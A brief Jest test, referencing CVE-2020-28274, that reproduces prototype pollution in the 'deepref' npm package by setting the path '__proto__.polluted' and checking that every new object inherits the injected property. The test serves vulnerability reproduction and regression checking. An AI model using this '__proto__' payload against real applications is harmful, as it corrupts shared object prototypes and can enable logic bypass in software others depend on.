//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28274
test("prototype pollution in deepref", () => {
    
    var deepref = require("deepref")
    var obj = {}

    expect({}.polluted).toBe(undefined);
    

    deepref.set(obj, '__proto__.polluted', 'yes');
    expect({}.polluted).toBe("yes");
  });